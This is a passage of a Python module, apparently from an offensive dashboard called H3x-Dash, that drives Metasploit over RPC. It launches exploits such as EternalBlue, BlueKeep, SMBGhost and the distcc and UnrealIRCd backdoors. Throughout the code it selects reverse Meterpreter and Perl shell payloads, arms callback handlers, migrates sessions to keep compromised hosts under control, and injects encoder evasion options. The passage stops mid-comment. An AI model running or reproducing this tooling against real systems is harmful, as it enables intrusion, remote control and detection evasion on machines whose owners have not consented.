"""
H3x-Dash MsfEngine
Thread-safe wrapper around pymetasploit3's MsfRpcClient.
Includes socket pre-check, SSL auto-detection, and background
reconnect loop so H3x-Dash keeps trying until msfrpcd is up.

Start msfrpcd (no SSL) before launching H3x-Dash:
    msfrpcd -P msfrpc -S -f
"""
import functools
import socket
import threading
import time


# How long to wait for a TCP connection to msfrpcd (seconds)
_CONNECT_TIMEOUT = 5

# Seconds between auto-reconnect attempts
_RETRY_INTERVAL  = 10


# ── Fragile exploits that benefit from stager-level migration ─────────────────
# Kernel-injection exploits (EternalBlue family, BlueKeep) land their payload in
# an unstable host process that frequently dies seconds after — and often DURING
# meterpreter staging, before any post-session migration can fire. The robust
# fix is PrependMigrate: a payload-stager option that migrates into a fresh,
# stable process BEFORE meterpreter loads. The stager spawns its target process,
# moves into it, and only then pulls down meterpreter — so the unstable host
# process is abandoned before meterpreter ever lives there. This is the standard
# operator mitigation for the "session opened then died" pattern.
_FRAGILE_EXPLOIT_MARKERS = (
    'ms17_010_eternalblue',
    'eternalblue',
    'ms17_010',          # covers eternalblue variants; psexec lands in a clean
                         # service but the prepend is harmless there
    'cve_2019_0708',     # BlueKeep — RDP kernel UAF, very unstable session
    'bluekeep',
    'cve_2020_0796',     # SMBGhost — SMBv3 kernel
    'smbghost',
)
# Stager-level migration SPAWNS a fresh process, so naming a process here is
# safe — PrependMigrate creates it before meterpreter loads.
_PREPEND_MIGRATE_PROC = 'rundll32.exe'
# Post-session migration for stageless payloads MUST spawn its own process.
# Migrating by existing-process-name fails when that process isn't already
# running — rundll32 is transient and explorer only exists at an interactive
# logon, so on a freshly-booted Win7 the migrate silently fails and meterpreter
# stays in the dying kernel-injected host (the "session opened then died"
# pattern). post/windows/manage/migrate spawns a new host (notepad.exe by
# default) and migrates into it, reliable regardless of target state.
_MIGRATE_POST_MODULE = 'post/windows/manage/migrate'

_CURATED_DEFAULT_PAYLOADS = {
    # Kernel SMB exploits: use the STAGED x64 reverse Meterpreter. This is the
    # module's own default and is always compatible. The stageless variant
    # (meterpreter_reverse_tcp) is rejected as "not valid" on some MSF builds
    # for this exploit's compatible-payload list, so we do not force it.
    # Session survival is handled by PrependMigrate (spawns a fresh host at the
    # stager level) + EXITFUNC thread, not by payload choice.
    'exploit/windows/smb/ms17_010_eternalblue':
        'windows/x64/meterpreter/reverse_tcp',
    'exploit/windows/smb/cve_2020_0796_smbghost':
        'windows/x64/meterpreter/reverse_tcp',
    # Metasploitable cmd-exec classics — reverse_perl is MSF-compatible on
    # distcc_exec; reverse_bash /dev/tcp and reverse_netcat_gaping are not.
    'exploit/unix/misc/distcc_exec':
        'cmd/unix/reverse_perl',
    'exploit/unix/irc/unreal_ircd_3281_backdoor':
        'cmd/unix/reverse_perl',
    'exploit/multi/samba/usermap_script':
        'cmd/unix/reverse_perl',
    # NOTE: vsftpd_234_backdoor is deliberately NOT here. Its payload is
    # cmd/unix/interact, which MSF rejects when set explicitly — the launch
    # profile (payload_mode='interact') makes the engine leave PAYLOAD blank so
    # the module's own default is used. See _run_exploit_inner payload tailoring.
}

# distcc/IRC fire the callback before the module's internal handler() runs.
# Arm exploit/multi/handler as a background job first so LHOST:LPORT is
# listening when the one-liner executes — prevents open-then-die sessions.
_HANDLER_FIRST_EXPLOITS = (
    'exploit/unix/misc/distcc_exec',
    'exploit/unix/irc/unreal_ircd_3281_backdoor',
)

# Payloads MSF accepts per module (for rejection diagnostics).
_MODULE_COMPATIBLE_PAYLOADS: dict[str, list[str]] = {
    'exploit/unix/misc/distcc_exec': [
        'cmd/unix/reverse_perl',
        'cmd/unix/reverse',
        'generic/shell_reverse_tcp',
        'cmd/unix/bind_perl',
    ],
}

# Adaptive fallback after repeated session deaths. Kept as the same staged
# payload (the stageless variant is not universally accepted for these modules);
# the real adaptation is escalated migration + EXITFUNC, applied at launch.
_ADAPTIVE_STAGELESS_PAYLOADS = {
    'exploit/windows/smb/ms17_010_eternalblue':
        'windows/x64/meterpreter/reverse_tcp',
    'exploit/windows/smb/cve_2020_0796_smbghost':
        'windows/x64/meterpreter/reverse_tcp',
}


def _is_fragile_exploit(module: str) -> bool:
    m = (module or '').lower()
    return any(marker in m for marker in _FRAGILE_EXPLOIT_MARKERS)


def _curated_default_payload(module: str) -> str | None:
    """Return a known-compatible payload for modules where blank is risky."""
    m = (module or '').lower()
    for needle, payload in _CURATED_DEFAULT_PAYLOADS.items():
        if needle in m:
            return payload
    return None


def _is_cmd_reverse_payload(payload: str | None) -> bool:
    pl = (payload or '').lower()
    return pl.startswith('cmd/unix/') and 'reverse' in pl


def _needs_handler_first(module: str, payload: str | None) -> bool:
    return (_is_cmd_reverse_payload(payload)
            and any(marker in (module or '')
                    for marker in _HANDLER_FIRST_EXPLOITS))


def _is_interact_payload(payload: str | None) -> bool:
    return bool(payload and 'interact' in payload.lower())


# Console lines that mean a background handler job is listening.
_HANDLER_READY_MARKERS = (
    'started reverse tcp handler',
    'started reverse double handler',
    'started reverse ssl handler',
    'started bind tcp',
    'reverse handler',
    'listening on',
)


def _mask_console_cmd(cmd: str) -> str:
    for sensitive in ('PASSWORD', 'PASS', 'SMBPass', 'BindPass'):
        if sensitive in cmd:
            prefix, _, _ = cmd.rpartition(' ')
            return f'{prefix} ********'
    return cmd


def _append_datastore_options(commands: list[str], options: dict,
                              skip: tuple[str, ...] = ()) -> None:
    for k, v in (options or {}).items():
        if k in skip or v in (None, ''):
            continue
        commands.append(f'set {k} {v}')


def _is_stageless_payload(payload: str) -> bool:
    """
    True for single-file payloads like windows/x64/meterpreter_reverse_tcp.
    PrependMigrate is a *stager* option and has no effect on these — they
    need InitialAutoRunScript instead.
    """
    pl = (payload or '').lower()
    if not pl.startswith('windows/'):
        return False
    return '/meterpreter/' not in pl and 'meterpreter_' in pl


def _migrate_autorun_script(death_count: int = 0) -> str:
    """
    Spawn-and-migrate AutoRunScript for stageless payloads. Always spawns a
    fresh host process and migrates into it, so it never depends on a process
    already running on the target — the failure mode behind repeated EternalBlue
    session deaths. death_count is accepted for future tuning; the spawn-based
    approach is reliable from the first attempt.
    """
    return _MIGRATE_POST_MODULE


def _first_rhost(rhosts) -> str:
    """Normalize RHOSTS to the first host token for per-target adaptation."""
    return str(rhosts or '').split(',')[0].strip().lower()


def _port_open(host: str, port: int, timeout: float = _CONNECT_TIMEOUT) -> bool:
    """Quick TCP reachability check — avoids hanging the whole app."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


class MsfEngine:

    def __init__(self):
        self._client    = None
        self._connected = False
        self._version   = None
        self._lock         = threading.Lock()
        self._exploit_lock = threading.Lock()   # prevents concurrent exploit launches
        # Serializes every RPC call on the shared pymetasploit3 client. That
        # client uses one requests.Session + msgpack stream and is NOT
        # thread-safe: the sessions poll (4s), the per-session read poll (1.5s),
        # the auto-reconnect health-check (core.version), and a running exploit
        # console all hit it concurrently. Interleaved calls corrupt the response
        # stream, which made the health-check throw, flip _connected False, and
        # blank list_sessions() — a live session would show in msfrpcd but vanish
        # from the Shell panel. We wrap client.call (the single chokepoint every
        # RPC funnels through) so calls never interleave.
        self._rpc_lock = threading.RLock()
        self._retry_thr = None        # background reconnect thread
        self._stop_retry = threading.Event()
        self._last_error = None       # last connection error string
        # session_id -> {module, rhost} for newly-opened sessions
        self._session_origin: dict[str, dict] = {}
        # (module, rhost) -> dead-session count
        self._dead_session_counts: dict[tuple[str, str], int] = {}
        # (module, rhost) -> list of accumulated resolver insights (info gained)
        self._run_insights: dict[tuple[str, str], list] = {}
        self._session_state_lock = threading.Lock()
        # Per-session I/O locks — the Shell panel polls /read every 1.5s while
        # /run commands are in flight. Without serialization the poll steals
        # command output and can false-trigger "session died" on slow shells.
        self._sid_io_locks: dict[str, threading.RLock] = {}
        self._sid_io_guard = threading.Lock()

    # ── Connection ────────────────────────────────────────────────────────────

    def connect(self, host='127.0.0.1', port=55553, password='msfrpc', ssl=False) -> dict:
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except ImportError:
            return {
                'status':  'error',
                'message': (
                    'pymetasploit3 not installed. Install on Kali: '
                    'sudo apt-get install python3-pymetasploit3  '
                    '(or pip install pymetasploit3 --break-system-packages '
                    'if the apt package is unavailable in your Kali version)'
                ),
            }

        # ── 1. TCP reachability check ─────────────────────────────────────────
        if not _port_open(host, port):
            msg = (
                f'Cannot reach {host}:{port} — '
                'is msfrpcd running?  Start it with: '
                'msfrpcd -P msfrpc -S -f'
            )
            with self._lock:
                self._connected = False
                self._last_error = msg
            return {'status': 'error', 'message': msg}

        # ── 2. Try to authenticate ────────────────────────────────────────────
        #    pymetasploit3 uses requests under the hood; when msfrpcd was started
        #    with -S (no SSL) we must pass ssl=False explicitly AND the library
        #    must not override it.  We try no-SSL first, then SSL as a fallback.
        attempts = [(False, 'no-SSL'), (True, 'SSL')]
        if ssl:
            attempts = [(True, 'SSL'), (False, 'no-SSL')]

        last_exc = None
        for use_ssl, label in attempts:
            try:
                client  = MsfRpcClient(
                    password,
                    server = host,
                    port   = port,
                    ssl    = use_ssl,
                )
                self._serialize_client_rpc(client)
                version = client.core.version      # ping — raises if auth fails
                with self._lock:
                    self._client    = client
                    self._version   = version
                    self._connected = True
                    self._last_error = None
                print(f'[H3x-Dash] MSF RPC connected ({label}) — {version}')
                return {'status': 'connected', 'version': version}
            except Exception as exc:
                last_exc = exc
                continue

        msg = f'Auth failed ({host}:{port}): {last_exc}'
        with self._lock:
            self._connected  = False
            self._client     = None
            self._last_error = msg
        return {'status': 'error', 'message': msg}

    def _serialize_client_rpc(self, client) -> None:
        """Wrap the client's low-level `call` so every RPC is serialized.

        pymetasploit3 routes ALL RPC (core, sessions, consoles, modules) through
        ``MsfRpcClient.call`` — sub-managers and console objects each hold a
        reference to this client and invoke ``self.rpc.call(...)``. Shadowing the
        bound method with a lock-guarded wrapper therefore serializes every RPC
        on the shared HTTP/msgpack transport without touching call sites. Idempotent.
        """
        try:
            if getattr(client, '_h3x_serialized', False):
                return
            orig_call = client.call
            rpc_lock = self._rpc_lock

            @functools.wraps(orig_call)
            def _locked_call(*args, **kwargs):
                with rpc_lock:
                    return orig_call(*args, **kwargs)

            client.call = _locked_call
            client._h3x_serialized = True
        except Exception as exc:
            # Never let hardening break a working connection.
            print(f'[H3x-Dash] RPC serialization wrap skipped: {exc}')

    def _client_ref(self):
        """
        Snapshot self._client under the lock and return it.
        Callers use the returned reference for RPC calls — safe because even
        if disconnect() sets self._client = None on another thread, the
        snapshot still holds the original object reference.
        Returns None if not connected.
        """
        with self._lock:
            return self._client if self._connected else None

    def _adaptive_payload_for(self, module: str, rhosts) -> tuple[str | None, int]:
        """Return (payload, death_count) for adaptive stageless fallback."""
        module_key = (module or '').lower()
        candidate = _ADAPTIVE_STAGELESS_PAYLOADS.get(module_key)
        if not candidate:
            return None, 0
        key = (module_key, _first_rhost(rhosts))
        with self._session_state_lock:
            deaths = self._dead_session_counts.get(key, 0)
        if deaths > 0:
            return candidate, deaths
        return None, 0

    def _remember_session_origin(self, sessions: list, module: str, rhosts,
                                 payload: str | None = None) -> None:
        """Link newly-opened session IDs back to module+payload+target context.

        The payload is recorded so the handoff layer can distinguish reverse,
        bind, and interact deliveries (which need different post-land handling)
        long after the launch console is gone.
        """
        module_key = (module or '').lower()
        rhost_key = _first_rhost(rhosts)
        if not module_key or not rhost_key:
            return
        with self._session_state_lock:
            for s in sessions or []:
                sid = str(s.get('id', '')).strip()
                if sid:
                    self._session_origin[sid] = {
                        'module':  module_key,
                        'rhost':   rhost_key,
                        'payload': (payload or '').lower(),
                    }

    def _note_dead_session(self, session_id: str) -> tuple[str | None, str | None, int]:
        """
        Mark one dead session for its originating module+target.
        Returns (module, rhost, count) or (None, None, 0) if unknown.
        """
        sid = str(session_id).strip()
        if not sid:
            return None, None, 0
        with self._session_state_lock:
            origin = self._session_origin.pop(sid, None)
            if not origin:
                return None, None, 0
            key = (origin.get('module', ''), origin.get('rhost', ''))
            self._dead_session_counts[key] = self._dead_session_counts.get(key, 0) + 1
            count = self._dead_session_counts[key]
        return key[0], key[1], count

    def disconnect(self):
        self._stop_retry.set()          # kill retry thread if running
        with self._lock:
            self._client    = None
            self._connected = False
            self._version   = None

    def is_connected(self) -> bool:
        return self._connected and self._client is not None

    def get_version(self) -> str | None:
        return self._version

    def get_last_error(self) -> str | None:
        return self._last_error

    def get_session_count(self) -> int:
        return len(self.list_sessions())

    # ── Auto-reconnect ────────────────────────────────────────────────────────

    def start_auto_connect(self, host='127.0.0.1', port=55553,
                           password='msfrpc', ssl=False):
        """
        Spawn a background thread that keeps trying to connect until it
        succeeds.  Safe to call multiple times — only one thread runs.
        """
        if self._retry_thr and self._retry_thr.is_alive():
            return  # already running

        self._stop_retry.clear()
        self._retry_thr = threading.Thread(
            target   = self._reconnect_loop,
            args     = (host, port, password, ssl),
            daemon   = True,
            name     = 'h3x-msf-autoconnect',
        )
        self._retry_thr.start()

    def _reconnect_loop(self, host, port, password, ssl):
        attempt = 0
        health_fails = 0
        while not self._stop_retry.is_set():
            if self.is_connected():
                # Already up — just health-check every _RETRY_INTERVAL seconds.
                # Require TWO consecutive failures before declaring the link lost:
                # a single transient error must not flip _connected and blank the
                # Shell panel for a session that is still very much alive.
                try:
                    _c = self._client_ref()
                    if _c is None:
                        raise RuntimeError('client is None')
                    _ = _c.core.version
                    health_fails = 0
                except Exception as exc:
                    health_fails += 1
                    if health_fails >= 2:
                        with self._lock:
                            self._connected = False
                            self._client    = None
                        health_fails = 0
                        print('[H3x-Dash] MSF RPC connection lost — retrying...')
                    else:
                        print(f'[H3x-Dash] MSF RPC health-check hiccup '
                              f'({exc.__class__.__name__}) — re-checking before '
                              f'declaring lost')
                        self._stop_retry.wait(1.0)
                        continue
                self._stop_retry.wait(_RETRY_INTERVAL)
                continue

            attempt += 1
            print(f'[H3x-Dash] MSF RPC connect attempt {attempt} '
                  f'({host}:{port}) ...')
            result = self.connect(host=host, port=port,
                                  password=password, ssl=ssl)
            if result['status'] == 'connected':
                print(f'[H3x-Dash] MSF RPC online — {result.get("version","")}')
                # Stay in loop to health-check, but slow down
                self._stop_retry.wait(_RETRY_INTERVAL)
            else:
                print(f'[H3x-Dash] MSF RPC unavailable — '
                      f'{result.get("message","")}  '
                      f'(retry in {_RETRY_INTERVAL}s)')
                self._stop_retry.wait(_RETRY_INTERVAL)

    # ── Module search ─────────────────────────────────────────────────────────

    def search(self, query: str) -> list:
        client = self._client_ref()
        if client is None:
            return []
        try:
            raw = client.modules.search(query)
            return [
                {
                    'fullname':    m.get('fullname', ''),
                    'type':        m.get('type', ''),
                    'rank':        m.get('rank', ''),
                    'description': m.get('description', ''),
                }
                for m in (raw or [])[:50]
            ]
        except Exception as e:
            return [{'error': str(e)}]

    # ── Exploit execution ─────────────────────────────────────────────────────

    def run_exploit(self, module: str, options: dict, payload: str = None,
                    target: int = None, action: str = 'run',
                    poll_timeout: int = 60, auto_migrate=None) -> dict:
        """
        Dispatch an exploit/auxiliary/post module via msfrpcd.

        Args:
            module:       full module path (e.g. exploit/windows/smb/ms17_010_eternalblue)
            options:      dict of options (RHOSTS, RPORT, LHOST, LPORT, etc.)
            payload:      payload module path, or None for module default
            target:       target index (None = module default, usually 0)
            action:       'run' to exploit, 'check' to test vuln without exploiting
            poll_timeout: max seconds to wait for console to go idle (default 60)
            auto_migrate: harden fragile exploits by migrating the session out of
                          its host process the instant it opens. None = auto
                          (on for kernel-injection exploits like eternalblue,
                          off otherwise). True/False to force.

        Returns a dict with status, result (the wrapper log), console_output
        (raw MSF output), sessions (new sessions opened), and outcome flags
        (exploit_failed, check_vulnerable, check_safe).
        """
        client = self._client_ref()
        if client is None:
            return self._finish_exploit_run(
                module, options, payload, target, action, poll_timeout, auto_migrate,
                {'status': 'error', 'message': 'Not connected to Metasploit RPC'})
        if not module:
            return self._finish_exploit_run(
                module, options, payload, target, action, poll_timeout, auto_migrate,
                {'status': 'error', 'message': 'No module specified'})

        # Prevent concurrent exploit launches on the same RPC connection.
        if not self._exploit_lock.acquire(blocking=False):
            return self._finish_exploit_run(
                module, options, payload, target, action, poll_timeout, auto_migrate,
                {'status': 'error',
                 'message': 'An exploit is already running — wait for it to complete'})
        try:
            result = self._run_exploit_inner(client, module, options or {},
                                             payload, target, action, poll_timeout,
                                             auto_migrate)
            return self._finish_exploit_run(
                module, options, payload, target, action, poll_timeout, auto_migrate,
                result)
        finally:
            self._exploit_lock.release()

    @staticmethod
    def _finish_exploit_run(module, options, payload, target, action, poll_timeout,
                            auto_migrate, result: dict) -> dict:
        """Persist exploit run to logs/exploit/ — never raises."""
        try:
            from modules.ops_log import ops_log
            ops_log.log_exploit_run(
                module=module,
                options=options or {},
                payload=payload,
                target=target,
                action=action or 'run',
                auto_migrate=auto_migrate,
                poll_timeout=poll_timeout,
                result=result,
            )
        except Exception:
            pass
        return result

    def _run_exploit_inner(self, client, module: str, options: dict,
                           payload: str = None, target: int = None,
                           action: str = 'run', poll_timeout: int = 60,
                           auto_migrate=None) -> dict:
        """
        Run a module via the msfrpcd consoles API.

        Why console-based: client.modules.use() + module.execute() dispatches
        the exploit but DOESN'T capture the runtime output ("Selected Target",
        "Sending stage", "Exploit failed: ..."). The consoles API runs commands
        through a real msf6 console where every line is visible. That's the
        difference between debuggable and undebuggable.

        Also fixes the LHOST/LPORT drop bug: setting them on the console
        datastore makes them available to the module's *default* payload —
        no need to choose an explicit payload just to set a callback address.
        """
        log = []
        L = lambda line='': log.append(line)

        # ── Layer evasion options into the datastore ──────────────────────
        # If the operator has selected a stealth level on the dashboard,
        # MSF encoder + stage-encoding options get injected here. Operator-
        # supplied options take precedence (their explicit ENCODER overrides
        # the evasion-profile default), so this is non-intrusive.
        try:
            from modules import evasion as _evasion
            evasion_opts = _evasion.msf_options_for()
            # Only inject for exploits; aux/post modules don't take encoders
            is_exploit = (module or '').startswith('exploit/')
            if evasion_opts and is_exploit:
                merged = dict(evasion_opts)
                merged.update(options or {})       # operator wins on conflict
                options = merged
                profile = _evasion.level_profile()
                if profile['level'] > 0:
                    L(f'STEALTH  : {profile["name"]} (level {profile["level"]}) '
                      f'— {evasion_opts.get("ENCODER", "no encoder")} '
                      f'× {evasion_opts.get("EncoderItr", 0)} iterations')
        except Exception as _ex:
            pass    # never let evasion config break exploit dispatch

        # ── Parse module type ─────────────────────────────────────────────
        _VALID_TYPES = ('exploit', 'auxiliary', 'post', 'payload', 'evasion')
        _mod_parts   = module.split('/')
        _mod_type    = _mod_parts[0] if _mod_parts and _mod_parts[0] in _VALID_TYPES else 'exploit'
        _mod_name    = '/'.join(_mod_parts[1:]) if len(_mod_parts) > 1 else module

        # ── Curated payload default for fragile reverse-session exploits ──
        # If the UI/operator leaves PAYLOAD blank, MSF may still choose a
        # reverse payload internally. That used to bypass our LHOST validation
        # and PrependMigrate hardening because h3x-dash could not see the
        # implicit payload name. For x64-native kernel SMB exploits, make the
        # payload explicit before validation and hardening.
        _verb = action if action in ('check', 'run', 'exploit') else 'run'

        # ── Profile-driven payload tailoring ──────────────────────────────
        # The launch profile knows how each module delivers a shell. For
        # interact/find-shell modules (vsftpd backdoor) the module ships its
        # OWN default payload (cmd/unix/interact) and MSF rejects an explicitly
        # set one ("the value specified for payload is not valid"). So we must
        # NOT set PAYLOAD at all — leave it blank and let the module default
        # stand. This is the canonical, most-compatible behaviour.
        from modules.launch_profiles import resolve_launch_profile
        _profile = resolve_launch_profile(module)
        _leave_payload_default = False
        if _profile.get('payload_mode') == 'interact':
            _leave_payload_default = True
            if payload:
                L(f'[*] {_profile["label"]}: not setting PAYLOAD explicitly — '
                  f'using the module default (MSF rejects an explicitly-set '
                  f'interact payload). Cleared: {payload}')
            payload = None

        if (not _leave_payload_default and not payload
                and _verb in ('run', 'exploit') and _mod_type == 'exploit'):
            adaptive_payload, deaths = self._adaptive_payload_for(
                module, options.get('RHOSTS', '')
            )
            if adaptive_payload:
                payload = adaptive_payload
                L(f'[*] Payload auto-selected (adaptive): {payload}')
                L(f'    (prior session-died events detected for this target: '
                  f'{deaths}; preferring stageless)')
            else:
                # Prefer the launch-profile default; fall back to the curated map.
                curated_payload = (_profile.get('default_payload')
                                   or _curated_default_payload(module))
                if curated_payload:
                    payload = curated_payload
                    L(f'[*] Payload auto-selected: {payload}')
                    L(f'    (default for {_profile["label"]}; needed for '
                      f'LHOST validation and session hardening)')

        # ── Auto-correct known wrong RPORTs ───────────────────────────────
        # Some modules MUST use a specific port regardless of which port
        # triggered the suggestion. ms17_010_* exploits SMBv1 on 445 — if the
        # UI pre-filled 139 (NetBIOS, the other SMB-ish port) the exploit will
        # connect but the SMBv1 negotiation fails and you get a confusing
        # "exploit completed but no session". Force the correct port and tell
        # the operator we did.
        # Driven by launch_profiles.force_rport — single source of truth shared
        # with the UI so the operator and the engine agree on the correct port.
        # Reuse the profile already resolved during payload tailoring.
        _lp = _profile
        _force = _lp.get('force_rport')
        if _force and str(options.get('RPORT', '')) not in ('', str(_force)):
            wrong = options.get('RPORT')
            options = dict(options)
            options['RPORT'] = str(_force)
            L(f'[!] RPORT auto-corrected {wrong} → {_force} '
              f'({_lp["label"]} requires port {_force}, not {wrong})')
        # Strip options that don't apply to the chosen PAYLOAD type so MSF never
        # rejects "Unknown datastore option: LHOST" (the bug seen on a bind run).
        # Driven by the payload name, not just the launch profile — the operator
        # can pick bind on a reverse-profile module (e.g. distcc + bind_perl).
        #   reverse  → needs LHOST + LPORT
        #   bind     → needs LPORT (target's listen port), NOT LHOST
        #   interact → neither (module finds its own shell)
        _pl = (payload or '').lower()
        _strip_lhost = _strip_lport = False
        if 'interact' in _pl or not _lp.get('uses_lhost', True):
            _strip_lhost = _strip_lport = True
            _why = f'{_lp["label"]} uses no reverse callback'
        elif 'bind' in _pl:
            _strip_lhost = True          # bind keeps LPORT (target bind port)
            _why = 'bind payload connects out to the target — LHOST not used'
        if (_strip_lhost and options.get('LHOST')) or (_strip_lport and options.get('LPORT')):
            options = dict(options)
            if _strip_lhost:
                options.pop('LHOST', None)
            if _strip_lport:
                options.pop('LPORT', None)
            L(f'[!] Stripped {"LHOST/LPORT" if _strip_lport else "LHOST"} — {_why}')

        # ── Pre-flight banner ─────────────────────────────────────────────
        L(f'MODULE   : {module}')
        L(f'ACTION   : {action}')
        L(f'TARGET   : {options.get("RHOSTS","?")} : {options.get("RPORT","?")}')
        if target is not None:
            L(f'TGT IDX  : {target}')
        L(f'PAYLOAD  : {payload or "(module default)"}')
        lhost = options.get('LHOST', '')
        lport = options.get('LPORT', '')
        if lhost:
            L(f'HANDLER  : {lhost} : {lport or "4444 (default — set automatically)"}')
        else:
            L(f'HANDLER  : (no LHOST set — reverse payloads will FAIL)')
        extra = {k: v for k, v in (options or {}).items()
                 if k not in ('RHOSTS', 'RPORT', 'LHOST', 'LPORT')}
        if extra:
            L(f'OPTIONS  : {extra}')
        L()

        # ── Validate module via module RPC (lightweight — doesn't execute) ─
        # If pymetasploit3 chokes loading metadata, we DON'T bail — the
        # console-based execution that follows works without test_mod. Skip
        # pre-flight, log the limitation, continue.
        #
        # But IF .use() returns None/unusable (no exception), that means the
        # module truly doesn't exist — bail with a clear error.
        L(f'[*] Validating module... ({_mod_type})')
        test_mod = None
        load_failed_gracefully = False     # exception we degraded past
        try:
            test_mod = client.modules.use(_mod_type, _mod_name)
        except (TypeError, KeyError) as exc:
            if 'subscriptable' in str(exc) or 'iterable' in str(exc):
                # pymetasploit3 trips on malformed module.compatible_payloads
                # responses for some exploit modules. Known library quirk,
                # not an msfrpcd bad state. Auxiliary modules don't hit this
                # because they skip the compatible_payloads RPC call.
                L(f'[!] pymetasploit3 cannot parse {module} metadata — '
                  f'skipping pre-flight')
                L(f'    (library threw: {type(exc).__name__}: {exc})')
                L(f'    Known compatibility quirk between pymetasploit3 and')
                L(f'    some MSF versions when enumerating compatible payloads.')
                L(f'    Module will still fire via console — missing options')
                L(f'    will surface in MSF output instead of pre-flight.')
                L(f'')
                load_failed_gracefully = True
                test_mod = None
                # Fall through to console execution
            else:
                L(f'[ERROR] Module load raised: {type(exc).__name__}: {exc}')
                return {'status': 'error',
                        'message': f'Module load failed: {exc}',
                        'result':  '\n'.join(log)}
        except Exception as exc:
            L(f'[ERROR] Module load raised: {exc}')
            return {'status': 'error',
                    'message': f'Module load failed: {exc}',
                    'result':  '\n'.join(log)}

        # Module truly not found: .use() returned no usable object AND no
        # graceful-degradation exception fired. Bail with the same diagnostic
        # message we've always shown for missing modules.
        if not load_failed_gracefully and (
            not test_mod or not hasattr(test_mod, 'options')):
            L(f'[ERROR] Module not loaded: {module}')
            L(f'  msfrpcd did not return a usable module for')
            L(f'    type:  {_mod_type}')
            L(f'    path:  {_mod_name}')
            L(f'  Verify it exists:  msfconsole -q -x "use {module}; exit"')
            L(f'  Or:                grep -r "{_mod_name}" /usr/share/metasploit-framework/modules/')
            return {'status': 'error',
                    'message': f'Module not found: {module}',
                    'result':  '\n'.join(log)}

        # Inspect metadata only when we have a working test_mod
        if test_mod is not None:
            try:
                L(f'[*] Rank      : {test_mod.rank}')
                tgt_list = list(getattr(test_mod, 'targets', []) or [])
                L(f'[*] Targets   : {len(tgt_list)}')
                if tgt_list:
                    show_count = min(6, len(tgt_list))
                    for i in range(show_count):
                        marker = '←' if i == (target if target is not None else 0) else ' '
                        L(f'    [{i}]{marker} {tgt_list[i]}')
                    if len(tgt_list) > show_count:
                        L(f'    ... +{len(tgt_list) - show_count} more')
                        L(f'    (override default with the TARGET field if your OS')
                        L(f'     doesn\'t match target 0 — wrong target is the #1')
                        L(f'     cause of "exploit ran but no session")')
            except Exception:
                pass

        # ── Compatible-payload pre-check ──────────────────────────────────
        # When we're setting a payload explicitly, verify it's in the module's
        # compatible list before firing — otherwise MSF rejects it mid-run with
        # "the value specified for payload is not valid" and the exploit
        # silently uses the wrong default. If incompatible, fall back to the
        # profile default (when compatible) or the module default (blank).
        # Wrapped defensively: pymetasploit3 can raise on .payloads for some
        # modules (the same compatible_payloads quirk handled at module load).
        if payload and test_mod is not None and _verb in ('run', 'exploit'):
            compat = []
            try:
                compat = list(getattr(test_mod, 'payloads', []) or [])
            except Exception:
                compat = []
            if compat and payload not in compat:
                # Prefer a substitute of the SAME family (reverse↔reverse,
                # bind↔bind) so we never silently turn a reverse exploit into a
                # blank/default one — that would drop LHOST validation and
                # handler-first staging and fail silently. Order of preference:
                #   1. profile default (if compatible)
                #   2. a compatible payload of the same connection family
                #   3. keep the original (MSF will reject it, but the rejection
                #      is detected + fed to information_gained, and LHOST stays
                #      required so the operator sees the real problem)
                pl = payload.lower()
                fam = ('reverse' if 'reverse' in pl
                       else 'bind' if 'bind' in pl else None)
                prof_default = _profile.get('default_payload')
                same_family = next((p for p in compat
                                    if fam and fam in p.lower()), None)
                if prof_default and prof_default in compat:
                    L(f'[!] Payload {payload} not compatible — falling back to '
                      f'profile default {prof_default}')
                    payload = prof_default
                elif same_family:
                    L(f'[!] Payload {payload} not compatible — substituting a '
                      f'compatible {fam} payload: {same_family}')
                    payload = same_family
                else:
                    L(f'[!] Payload {payload} not in the module\'s compatible '
                      f'list — keeping it; MSF will report the mismatch.')
                    if compat:
                        L(f'    Compatible (first few): {", ".join(compat[:6])}')

        # ── Validate ONLY the critical no-default options before firing ───
        # History lesson: pymetasploit3's option metadata is unreliable as a
        # blocker. It has now produced false-positive "missing required" spam
        # three times — smb_login (39 framework options), then psexec
        # (CheckModule, which HAS a default of auxiliary/scanner/smb/smb_ms17_010
        # that pymetasploit3's runopts simply didn't surface).
        #
        # The lesson: MSF itself applies module defaults at run time. We should
        # NOT try to second-guess which options have defaults — MSF knows. We
        # only block on the tiny set of options that genuinely never have a
        # default AND that MSF cannot infer:
        #     RHOSTS / RHOST — the target. No module ships a default target.
        #     LHOST          — callback address for reverse payloads.
        # Everything else (CheckModule, SMB::*, NTLM::*, THREADS, ...) is left
        # to MSF, which fills defaults automatically when the module runs.
        CRITICAL_NO_DEFAULT = {'RHOSTS', 'RHOST'}
        provided_upper = {k.upper() for k, v in options.items()
                          if v not in (None, '')}

        missing_critical = []
        # Target is always required (unless this is a purely local/post module).
        if _mod_type not in ('post',):
            if not (provided_upper & CRITICAL_NO_DEFAULT):
                missing_critical.append('RHOSTS')

        # LHOST is required for reverse payloads — without it the callback has
        # nowhere to go. Detect reverse payloads by name.
        is_reverse = bool(payload and 'reverse' in payload.lower())
        if is_reverse and 'LHOST' not in provided_upper:
            missing_critical.append('LHOST')

        if missing_critical:
            L()
            L(f'[ERROR] Missing required option(s): {", ".join(missing_critical)}')
            for opt in missing_critical:
                hint = ('the target host — e.g. 192.168.1.43'
                        if opt == 'RHOSTS'
                        else 'your listener IP for the reverse callback')
                L(f'    {opt:<10} {hint}')
            L(f'  Set these in the options panel and re-launch.')
            _missing_result = {
                'status': 'error',
                'message': f'Missing required: {", ".join(missing_critical)}',
                'result':  '\n'.join(log),
                'missing_required': missing_critical,
            }
            # Feed the missing-option finding into the information-gained loop so
            # the next recommended plan requires these before launch.
            try:
                self._record_run_outcome(module, options.get('RHOSTS', ''),
                                         payload, target, False, _missing_result)
            except Exception:
                pass
            return _missing_result

        # ── Aux / post — strip payload + payload-only options ─────────────
        if _mod_type in ('auxiliary', 'post'):
            if payload:
                L(f'[!] {_mod_type} module — payload "{payload}" ignored')
                L(f'    Auxiliary and post modules do not deliver payloads;')
                L(f'    no session will result. Module writes findings to the')
                L(f'    MSF job console only.')
                payload = None
            for k in list(options.keys()):
                if k in ('LHOST', 'LPORT', 'EXITFUNC', 'EXITONSESSION'):
                    options.pop(k)

        # ── LPORT auto-default when LHOST set ─────────────────────────────
        # MSF will refuse to start a reverse handler without LPORT. Operator
